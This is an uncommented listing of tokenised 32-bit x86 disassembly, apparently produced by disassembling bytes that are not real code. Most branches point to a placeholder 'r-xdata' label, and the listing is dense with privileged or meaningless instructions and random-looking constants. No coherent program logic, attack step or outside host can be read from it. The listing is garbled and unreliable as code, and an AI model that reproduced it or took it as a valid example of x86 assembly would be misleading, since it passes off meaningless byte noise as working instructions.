jae r-xdata
pop ebx
mov ebx 0x24b58d86
jecxz r-xdata
psrlq mm4 mmx1
mul bl
shl [ ebx ] 0x1
mov edx 0x1bbe6aba
sbb al 0x1c
jae r-xdata
push 0x14750a0f
clc
jecxz r-xdata
jae r-xdata
or bl [ esi ]
cld
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
outsb
jae r-xdata
pushad
cmpsb [ esi ] [ edi ]
sbb ecx ebx
fisub [ esi - 0x549e13e9 ]
int 0xe3
jecxz r-xdata
jecxz r-xdata
and bp sp
jae r-xdata
adc al 0x1c
or esi ecx
jae r-xdata
lfs ecx [ ecx - 0x2c1c7419 ]
mov esp ebx
shl ebx cl
jecxz r-xdata
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
scasb [ edi ]
mov ebx 0x23a62486
mov ch 0x24
xchg esi eax
or cl [ ecx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and cx [ edx ]
sbb al 0x1c
pushad
jae r-xdata
or ah [ edx + 0x1a ]
sbb al 0x1c
mov [ 0x1fa6e01b ] eax
test [ edx - 0x5a ] ebp
xor eax 0x859089bb
push 0xffffffa6
cmp edi [ ebx + 0x6a858089 ]
cmpsb [ esi ] [ edi ]
cmp [ eax + 0x22 ] ebp
test [ edx - 0x5a ] ebp
jecxz r-xdata
jae r-xdata
pushfd
out 0xe3 eax
in al dx
int1
xlat
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
sbb al 0x60
xchg edi eax
mul ebx
outsb
fnstsw ax
pushad
mov edi 0xdc0af7c7
add ecx [ edx ]
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
sbb al 0x96
out dx eax
mov ebx esp
push 0xffffffa6
jae r-xdata
pop ds
jae r-xdata
mov ebx 0xb32354ec
jae r-xdata
pushad
cwde
mov esi 0xa9189b3
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb bl [ esp + ebx ]
jae r-xdata
inc ebp

push 0xffffffa6
out dx eax
or dh [ eax ]
pop es
sbb al 0x66
jae r-xdata
sbb al 0x60
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
jae r-xdata
pop es
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
pushad
in al dx
jae r-xdata
sbb al 0x1c
call 0x612a10dd
jecxz r-xdata
mov [ ecx - 0x1c0934f6 ] edx
jae r-xdata
std
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
cmpsb [ esi ] [ edi ]
aaa
mov bl 0x1c
xchg ebp eax
mov bl 0xa
cmp edi eax
jecxz r-xdata
in al dx
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
pop ss
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
pop ds
pop ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xa66a1ba6
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
test [ eax - 0x23 ] esp
jecxz r-xdata
and esi [ ebx - 0x6ff4da98 ]
jae r-xdata
jae r-xdata
daa
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
pop es
mov al 0xb3
or ecx [ ebx + 0x17 ]
sbb al 0x1c
or bl [ edi + 0x731c1c19 ]
jae r-xdata
or edx [ edi + edx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
imul esi [ eax + 0x17540bb3 ] 0x1c
lahf
mov edx 0xcf0a2366
adc [ esp + ebx ] bl
or ebp ebx
sahf
loope r-xdata
mov dh 0xa
xor [ edi ] al
jae r-xdata
push 0xffffffa6
pop ss
mov al 0xb3
or esi [ eax + edx ]
sbb al 0x1c
pushad
mov bl 0x25
cmpsb [ esi ] [ edi ]
sbb al 0xe3
or edi [ 0xffffffffb31c1c0e ]
cmpsb [ esi ] [ edi ]
sbb al 0xb5
mov bl 0xa
mov ch cl
jecxz r-xdata
rcl [ edi ] cl
sbb al 0x1c
mov [ edi + 0x1c87666e ] esp
sbb al 0x1c
mov ch 0xb3
or cl [ edx + 0x73e3e3e9 ]
jae r-xdata
adc bx si
jecxz r-xdata
push 0x17900b25
jae r-xdata
jae r-xdata
pop ss
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
or cl [ ebx + 0xa ]
sbb al 0x1c
jae r-xdata
sbb al 0x1c
in al 0xfb
sub dh [ ebp - 0x49957a4d ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
sbb al 0xb3
outsb
aaa
push ds
sbb al 0x1c
mov bl 0xb
mov [ 0x60e3e3eb ] al
sbb al 0xb3
or dl [ eax ]
add eax 0xec731c1c
push 0xffffffa6
jae r-xdata
outsb
or ah [ esi + 0x1 ]
daa
out dx eax
push 0xffffffa7
or edx [ eax + 0x601c1c17 ]
jae r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
test [ eax - 0x68 ] esp
mov dl 0xb3
sbb al 0x96
pop es
sbb al 0xb4
push 0xa6e01ba3
pop ds
jae r-xdata
sbb al 0x1c
jae r-xdata
iretd
add eax 0xf9920abb
jecxz r-xdata
test [ edx - 0x5a ] ebp
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
or dl [ ebx + 0x73e3e3fc ]
jae r-xdata
add eax 0x13ae6a85
or dl [ edi + 0x1d ]
mov bl 0x85
jae r-xdata
mov ch 0xe2
jecxz r-xdata
sahf
out 0xe3 eax
jecxz r-xdata
jae r-xdata
rcr [ eax + ebp * 2 ] 0x1
xchg edi eax
jae r-xdata
pop ss
push 0x9e6a851d
pop ebp
xchg [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
mov ebx 0xe3f9920a
jecxz r-xdata
jae r-xdata
or [ esp + ebx ] ebx
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
cld
jae r-xdata
push 0xffffffb6
jae r-xdata
jecxz r-xdata
or edx [ esi ]
sbb al 0x1c
mov [ 0xb666eb3 ] eax
pop ds
movsb [ edi ] [ esi ]
ficomp [ eax - 0x4a991335 ]
loop r-xdata
sbb bl [ esp + ebx ]
rcl [ 0x67ec2366 ] 0x1
bswap ebx
pushad
fucom st3
in al dx
and ecx [ ecx - 0x59957a09 ]
jae r-xdata
pop ss
pushad
and ch bl
or ah ah
sbb ebx [ esp + ebx ]
jae r-xdata
push 0xd0075e97
sub ch [ eax - 0x42 ]
pop ss
push 0x1c193035
jae r-xdata
cmpsb [ esi ] [ edi ]
xor edi [ ebx + 0x6a858689 ]
cmpsb [ esi ] [ edi ]
cmp [ esi - 0x5a ] ch
jae r-xdata
jecxz r-xdata
and bp sp
bswap ebx
jecxz r-xdata
arpl [ esi + 0x66ece1f3 ] bx
in al 0xfb
retn
jae r-xdata
jae r-xdata
outsb
jae r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xa66a1fa6
sub ah [ eax ]
jae r-xdata
jecxz r-xdata
out 0xe3 ax
adc [ 0xffffffffec731c1c ] al
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0xb3
or ebx eax
push cs
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
and edx eax
test [ ebp - 0x7ae45996 ] 0x6e0dae6a
test [ edx - 0x5a ] ebp
or eax 0x1c1fe50a
sbb al 0x73
jae r-xdata
pop esi
pop es
jae r-xdata
mov bl 0xec
push esp
in al 0xb3
test [ eax - 0x5c ] ebp
loope r-xdata
push esp
jae r-xdata
sar [ ebx + 0x6a85c689 ] 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
imul esi [ ebx + ecx - 0x1c1c17dd ] 0xbaba3b68
push 0xffffffbe
pop ds
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
adc ecx [ edx ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
nop [ esp + ebx ] bx
mov bl 0x68
adc al 0xb
jpo r-xdata
mov bl 0x6e
or bx [ edi ]
and ecx [ edx ]
test [ esi ] dl
sbb al 0x1c
mov bl 0xb
fmul [ esi ]
pushad
daa
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
loopne r-xdata
push ss
shr [ edx ] 0x1
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
xor [ edx ] ecx
push edx
out 0xe3 eax
jecxz r-xdata
push 0xffffffa6
loopne r-xdata
mov bl 0x68
jae r-xdata
mov ch 0x1c
mov ah 0xaf
push 0x65
dec ebx
jecxz r-xdata
xchg esi eax
test [ edx - 0x4a ] ebp
and bp sp
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
push 0xc30f600f
mov al 0xa
int 0x12
sbb al 0x1c
jae r-xdata
in al dx
mov bx 0xe3c9
jecxz r-xdata
outsb
push di
sbb ebx [ esp + ebx ]
mov bl 0xd0
cmp [ eax - 0x1c3dc5f6 ] dh
jecxz r-xdata
jae r-xdata
jae r-xdata
imul ebx [ bx + di ] 0xc18b1c1c
loope r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
push edi
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
daa
sub ah [ eax ]
in al dx
xchg ebp ebp
pushad
cmpsb [ esi ] [ edi ]
sbb eax [ ebp + 0x6e0dae6a ]
push 0xffffffa6
adc eax 0xf78923d0
test [ edx - 0x5a ] ebp
enter 0xe3e3 0x73
jae r-xdata
mov ch 0xb3
jae r-xdata
push 0x356817be
xor [ ecx ] bl
sbb al 0xa6
or ch [ eax ]
jmp r-xdata
int 0xe3
jecxz r-xdata
and eax 0x1c17900b
sbb al 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx eax
and ebp esp
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp ah ch
or esp [ ebx ]
call 0x3baf13a6
mov edx 0x1fbe6aba
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov esi 0xc9a00a1f
jae r-xdata
jae r-xdata
add edi [ ebx - 0x4ff56f77 ]
mov ecx eax
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
test [ edx - 0x4a ] ebp
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
jae r-xdata
loop r-xdata
jae r-xdata
mov ch 0xb4
or dh ah
or [ esp + ebx ] ebx
jae r-xdata
mov edi 0x60e3e3e9
loope r-xdata
out dx eax
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx esp
jae r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x7373202a ] eax
xchg esi eax
mov ebx 0x6a85c689
cmpsb [ esi ] [ edi ]
mov [ esi + 0xfb66a85 ] edx
mov ecx 0xdb66a85
mov [ esi - 0x1c1f5af6 ] ecx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x5
test [ edx - 0x52 ] ebp
mov eax 0x7373202a
sar [ eax ] 0x1
outsb
cmpsb [ esi ] [ edi ]
xchg ebp eax
or ch dh

push 0x9e6a8518
and ebp [ eax + 0x1a ]
or dl [ edx + 0x73e3e3cd ]
sbb eax 0x5d9e6a85
mov ebp ecx
jecxz r-xdata
sbb al 0x96
jae r-xdata
and al dl
jae r-xdata
jecxz r-xdata
jmp r-xdata
xchg ebx eax
sbb [ esp + ebx ] ebx
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
push 0x6ababa3b
mov esi 0xec38661f
jecxz r-xdata
stosd [ edi ]
retn
mov dl 0xb4
push 0x4b741c1b
in al dx
adc ax 0xe3fb
jecxz r-xdata
and esp [ ebx + 0x7373202a ]
mov al 0xa
dec ecx
int1
jecxz r-xdata
in al dx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
aas
fsub [ ebp - 0x44991329 ]
leave
jecxz r-xdata
dec ebx
and ebp esp
fld st5
jecxz r-xdata
jae r-xdata
lahf
push ds
sbb al 0x1c
mov bl 0xd0
adc eax 0xafb41cb5
cmp dh ah
and eax 0x688bd0e7
mov esi 0xe0f8681f
xor ch [ edx - 0x41 ]
shr eax cl
test eax ebx
xor ch ah
or ecx [ edx ]
jae r-xdata
sub ah dh
pop ecx
jae r-xdata
and esi [ ebx - 0x200f54d ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jge r-xdata
jae r-xdata
sub ebx edi
sbb al 0xb4
iretd
daa
mov [ 0x25d2308b ] eax
or edi [ edi + 0x60e3e3e9 ]
jae r-xdata
jecxz r-xdata
fidivr [ esi - 0x365ff5e1 ]
jae r-xdata
jae r-xdata
pushad
xchg [ edi ] bl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xf6
jecxz r-xdata
and esp esi
mov [ edx ] ch
out 0x59 al
and eax 0x73e3e3ea
jae r-xdata
enter 0xe3f1 0xe3
push 0x54ec1bbe
fdiv [ edx ]
in al dx
jecxz r-xdata
test [ edx - 0x9 ] ebp
push 0x9e6a851d
sbb eax edx
sbb al 0xa
or ebp [ ebx + 0x1ce3e3fc ]
pop edi
mov bl 0xa
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa6
pop ss
push 0xffffffa6
sbb ecx [ edx ]
lar ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
or ch [ ebx + 0x73e3e3c3 ]
jae r-xdata
jae r-xdata
ud1 eax [ ebp - 0x76f24996 ]
push 0xffffffb6
lahf
adc [ esp + ebx ] bl
or bh ch
rcl [ 0x65ec20d8 ] 0x1
mov bl 0x24
jecxz r-xdata
std
jecxz r-xdata
mov ebx 0xb00a9089
and [ ebx + 0x73 ] dh
or dl dh
scasb [ edi ]
sub eax 0x731c1c07
jae r-xdata
xchg esi eax
jae r-xdata
push cs
sbb al 0x1c
or bl [ eax - 0x761c1c10 ]
jecxz r-xdata
shr edi cl
and eax 0x20f3d3a7
xchg edi eax
jae r-xdata
jae r-xdata
jae r-xdata
retn 0xe3e3
sbb al 0xa
std
daa
out dx eax
ficomp [ eax + 0x1566ecdf ]
sti
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xa4ba66e ]
jae r-xdata
mov ch 0xb4
push 0xffffffa6
pop ds
or ch [ ecx ]
sti
sbb al 0x30
push 0xec156613
mov ch 0x19
sbb al 0x1c
mov ebx [ edi + 0x38 ]
dec eax
pop esi
mov ah 0x6a
pop ebp
daa
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x68
sbb ebx [ esp + esi * 2 ]
dec ebx
push 0xa1c661b
jecxz r-xdata
sbb eax 0x119e6a85
or al [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffff97
jecxz r-xdata
jae r-xdata
or ah [ 0x73e3e3ea ]
jae r-xdata
mov bl 0x6e
jae r-xdata
movnti [ eax + 0x1c12cd0a ] esi
sbb al 0x73
jae r-xdata
push es
sbb al 0xa
jecxz r-xdata
jae r-xdata
stosd [ edi ]
shl bl 0xe3
scasb [ di ]
pop ss
sbb al 0x1c
jae r-xdata
push 0x9e6a851d
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop edi
adc [ edx ] ecx
pop es
push 0xffffff9e
adc ebp [ eax + 0x1d ]
jecxz r-xdata
jmp 0x27a7150a
jecxz r-xdata
0x7373e3e3 0x3888
outsb
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
call [ ecx ]
sbb al 0x1c
outsd
pop ds
adc al 0x1c
sbb al 0x89
jecxz r-xdata
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xa
sbb eax [ ebx ]
sbb al 0x1c
jae r-xdata
sbb al 0x65
test [ edx - 0x62 ] ebp
in al dx
jae r-xdata
or ah [ ebx - 0x3f ]
jae r-xdata
pushfd
shl ebx cl
jecxz r-xdata
push ebx
mov ch 0x68
sbb eax 0x199e6a85
rcr [ edx + ecx ] 0x1
jae r-xdata
shl [ ebx ] 0x1
mov bl 0xb3
or bh bh
std
sbb esp [ esi + 0x1c ]
or cl [ ebx + 0x73e3e3e9 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or al 0x14
sbb al 0x1c
mov ah 0x12
sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]

stosd [ edi ]
loope r-xdata
sbb ebp esp
push esp
xlat
jecxz r-xdata
pop ds
loopne r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ 0x731c1c07 ]
jae r-xdata
mov [ edi - 0x1c1fe6f6 ] eax
jecxz r-xdata
and edi [ edx + ebp + 0x73737320 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
and [ ebx ] esi
or cl bh
out dx al
jecxz r-xdata
add [ ebx + 0x6a85aa89 ] edi
cmpsb [ esi ] [ edi ]
pop es
mov ebx 0x6a858789
cmpsb [ esi ] [ edi ]
add eax 0x858689bb
push 0xffffffa6
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cld
jecxz r-xdata
push 0xffffffa6
sbb ecx [ edx ]
mov [ 0x73e3e3ee ] eax
in al dx
pop es
jae r-xdata
bound ebx [ ebp + 0x5f ]
push 0xdf0f600f
mov al 0xd0
and esi [ ebp - 0x1c0431f6 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
jecxz r-xdata
pop ebp
pop edi
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jecxz r-xdata
jae r-xdata
jae r-xdata
hlt
push 0xffffffa6
jae r-xdata
mov al 0x3e
jae r-xdata
pop edi
mov bl 0x68
and eax 0x1c0b3d0a
sbb al 0x73
test [ eax - 0x26 ] esp
jecxz r-xdata
and ecx [ edx ]
imul eax [ edi ] 0x1c
sbb al 0x73
jae r-xdata
mov dh 0xa
shl bh 0xe3
aas
jae r-xdata
mov ebx 0x6a858d89
cmpsb [ esi ] [ edi ]
aaa
mov ebx 0xe20a9789
add ebx [ esp + ebx ]
jae r-xdata
mov ebp 0x73e3e3ce
in al dx
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
mov al [ 0xffffffffbc1c1c16 ]
push 0x3fe50a25
aad 0x1
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
xor al [ ebp - 0x2fec4996 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
sub [ ecx + 0x6a859489 ] edi
sbb al 0x97
sbb al 0x1c
jae r-xdata
pop edi
lea esi [ ebp - 0x1af55152 ]
cmp eax 0x73731c1c
mov ebx eax
test [ edx - 0x5a ] ebp
or [ ebx - 0x1c3887f6 ] edi
jecxz r-xdata
daa
stosd [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
mov [ esi + 0xba66a85 ] eax
jae r-xdata
or dh dh
add [ esp + ebx ] ebx
jae r-xdata
sbb al 0xc8
adc ah [ edi + 0x31 ]
jecxz r-xdata
sbb al 0x1c
mov esp 0xe50a2568
xchg esi eax
sbb al 0x1c
aad 0x1
jae r-xdata
or edi [ ebx - 0x1c3e9cf6 ]
mov ebx 0x6a858689
push esp
test [ edx - 0x9 ] ebp
in eax dx
test [ esi + 0x31 ] esp
in al dx
enter 0x6712 0x31
add [ esp + ebx ] ebx
jae r-xdata
jo r-xdata
xor esp ebp
jecxz r-xdata
jae r-xdata
jmp 0xffffffffb5f7176c
jae r-xdata
or ch [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x2b66ecf3
aas
jae r-xdata
xor [ ebp - 0x46ee4996 ] eax
mov [ edi + 0x2bb66a85 ] ecx
push 0xffffffb6
jae r-xdata
jae r-xdata
mov dh 0x2f
and bp sp
or bh dh
mul ebx
cmpsb [ esi ] [ edi ]
nop
and ebp esp
jae r-xdata
mov ecx 0xe3f4f20a
jecxz r-xdata
xchg esp eax
test [ edx - 0x4a ] ebp
das
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebp + 0x73e3e3ce ]
retn
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] ecx
sbb eax esp
jecxz r-xdata
jae r-xdata
mov ebp 0xeba66820
push 0xffffffa6
pop ds
or dl [ ecx + 0x731c1c1c ]
jae r-xdata
jae r-xdata
jae r-xdata
or bh bh
adc [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
stc
jecxz r-xdata
jae r-xdata
sbb al 0x1c
in al dx
sub di [ edi ]
jae r-xdata
sbb al 0xa
mov esp 0x731c1c3e
jae r-xdata
ja 0xffffffffb12a1771
mov bl 0xb0
mov al 0x89
in al 0xb0
or dl [ edx + ecx ]
adc al 0xb
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
and ebp esp
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
jae r-xdata
cmp bx [ esi ]
sbb al 0x1c
or al dh
in eax dx
jecxz r-xdata
jae r-xdata
push 0x1c1e3b66
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
inc bx
push ss
sbb al 0x1c
or bh [ esi + edi + 0x73731c1c ]
jae r-xdata
cmp eax 0x42871c1c
adc edx eax
push 0xb66a8532
jae r-xdata
adc eax 0x120a9189
loop r-xdata
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
fbstp [ eax + 0xab523d0 ]
jae r-xdata
or dh [ eax + 0x731c1c3e ]
jae r-xdata
into
sti
jecxz r-xdata
pandn mm6 [ eax + 0xab523d0 ]
jecxz r-xdata
or al al
mul ebx
pop ss
mov [ esi - 0x59957a45 ] eax
push 0xffffffa6
and bl [ edx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
xchg [ ebp - 0x46a04996 ] eax
mov [ ecx + 0x5db66a85 ] eax
or dl [ edx - 0xf ]
jecxz r-xdata
sub edi [ edi ]
jae r-xdata
and ecx [ edx ]
jae r-xdata
mov ch 0xb4
push 0xa38d01b
sbb al 0x1c
jae r-xdata
jae r-xdata
mov esi 0x9e6a8505
jae r-xdata
add eax 0x159e6a85
mov esi 0xb66a8507
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
sbb al 0x1c
jae r-xdata
and esp ebx
mov ebx 0xe3c1630a
jae r-xdata
and esp ebx
jecxz r-xdata
or ah [ esi - 0x78e3e3c3 ]
inc edx
jae r-xdata
or ah ah
hlt
test [ edx - 0x4a ] ebp
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in eax 0xe3
mov edi 0x1c1bcf0a
xchg edi eax
sbb al 0x1c
jae r-xdata
aad 0xb4
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp esp
mov al 0xa
adc al 0xa
and al 0xa6
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0xb3
jae r-xdata
jecxz r-xdata
sub ch ah
jae r-xdata
adc eax 0xbfb66a85
test [ edx - 0x62 ] ebp
jae r-xdata
mov eax [ 0xffffffff85b93a68 ]
test [ edx - 0x4a ] ebp
jae r-xdata
test [ edx - 0x5a ] ebp
sbb edx eax
and eax [ ebp + 0x6e19a66a ]
aaa
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x731c1c0b
fsub [ eax ]
arpl cx ax
mov eax 0xebbe6a85
or bl [ ebx + edx * 8 - 0x59971c1d ]
mov edi edx
jecxz r-xdata
push 0x65
and esp ebx
push 0xb66a8533
mov dh 0x13
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
adc [ ecx + 0x6a858f89 ] edi
mov dh 0x2b
bound ecx [ edi ]
jae r-xdata
shr [ edx - 0x69 ] cl
test eax 0xece3e3ee
push esp
not [ edx + 0xa332160 ]
iretd
adc eax 0x65ec20d8
push 0xffffffa6
and al 0xe3
loope r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
shl ebp 0xe3
jecxz r-xdata
push 0x65
mov [ ebx - 0x1c2c1c75 ] esp
pop ebx
jae r-xdata
outsb
mov ch 0xb3
or edx [ eax ]
push cs
sbb al 0x1c
in al dx
cli
or bl [ esp + ebx ]
shl [ ebx ] 0x1
mov ah 0x1c
mov ch 0x83
or cl [ edi + 0x73e3e3e5 ]
jae r-xdata
shr [ edx ] 0x1
test [ edx - 0x15 ] ebp
and [ ebx + 0x73 ] dh
jae r-xdata
bound esp [ edi ]
jecxz r-xdata
mov [ edx - 0x7a727647 ] ecx
push 0xffffffb6
mov dh 0xbf
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sahf
jae r-xdata
mov dh 0xa1
jae r-xdata
mov ecx 0x6a858d89
jae r-xdata
jae r-xdata
push 0xffffff9e
jae r-xdata
cmp bh [ ecx + 0x5be6a85 ]
xor [ edx ] ecx
test [ ecx ] 0x1c
sbb al 0x73
loopne r-xdata
mov al 0xb5
mov ah 0x68
sbb edx eax
cmp [ edx ] cl
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x7373202a
jae r-xdata
jecxz r-xdata
lodsb [ esi ]
dec ecx
or ebx [ esp + ebx ]
jae r-xdata
loopne r-xdata
jae r-xdata
xchg ebp eax
mov bl 0x1c
xchg ebp eax
xlat
sbb al 0x96
pop es
or bl [ ebx + 0x73e3e3f9 ]
jae r-xdata
or bh [ edx ]
push ebx
pop edi
jecxz r-xdata
jae r-xdata
retn
or ch [ eax + 0x7373e3e3 ]
jae r-xdata
jae r-xdata
and esp ebx
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ebp 0x661c1c0e
and ebp esp
out 0xe3 al
jecxz r-xdata

mov al [ 0xffffffffe3672462 ]
or esi [ esi - 0xd ]
int1
jecxz r-xdata
sub ch ah
test [ edx - 0x4a ] ebp
jae r-xdata
push 0x6a85b93a
jae r-xdata
lea eax [ ebp - 0x46424996 ]
mov [ edi - 0x1c39eff6 ] eax
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mul [ edx - 0x1c3a17f6 ]
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov dh 0x3f
or ebx [ edx ]
0xa66ee3e3 0xa1c
sahf
jae r-xdata
sbb [ ebp - 0x5a954b12 ] bl
iretd
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a859189
sbb al 0x96
test [ edx - 0x62 ] ebp
jecxz r-xdata
or cl ah
adc al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx 0x390a8289
jecxz r-xdata
jae r-xdata
int3
push 0x68f3c7af
xor al 0xb
jbe r-xdata
adc eax 0xe3cb6dec
jecxz r-xdata
cmp eax 0x1c3d6fec
sub al [ ebp + 0x7320eb6a ]
jae r-xdata
or dl [ eax ]
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x7320b8bd
jae r-xdata
fdivr [ 0x1c3d6fec ]
and bp sp
xlat
jae r-xdata
mov ecx 0x5be6a85
jae r-xdata
push 0xffffffa5
push ds
sbb al 0x1c
or esi esi
jmp ebx
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb [ esi + 0x66 ] ebp
aaa
mov edi 0x89b98a89
push 0xffffffb6
jae r-xdata
xchg ecx ebp
jae r-xdata
jae r-xdata
jae r-xdata
push 0x9e6a8519
pop ecx
mov [ esi - 0x61957a44 ] edx
or al bl
sti
jecxz r-xdata
mov eax [ eax - 0x32 ]
add ah bh
mov ah 0xa
shl [ ecx ] 0x1
jae r-xdata
sbb al 0x73
cmpsb [ esi ] [ edi ]
push ebx
or bl dl
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov edx 0x66ec2366
add dh ah
cmp [ esi - 0x349213eb ] dh
jecxz r-xdata
jecxz r-xdata
xor [ ecx - 0x41957a6c ] ecx
cmp [ esp + ebx ] ebx
jae r-xdata
outsd
jecxz r-xdata
jae r-xdata
sbb [ ecx - 0x61957a65 ] ecx
jecxz r-xdata
mov esp 0x5f9e6a85
push 0xe3e3235b
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
pop ebx
jae r-xdata
jecxz r-xdata
mov esp [ edx - 0x68 ]
faddp st0
mov ah 0x6a
movsd [ edi ] [ esi ]
lahf
or eax ecx
in eax 0xe3
jae r-xdata
jecxz r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
pop ebx
jae r-xdata
mov [ ebp + eax * 4 - 0x7af84196 ] edx
push 0xffffffb6
jae r-xdata
mov edx 0x51be6a85
jae r-xdata
jae r-xdata
jecxz r-xdata
in al dx
add dh ah
out dx eax
push 0x470aeba6
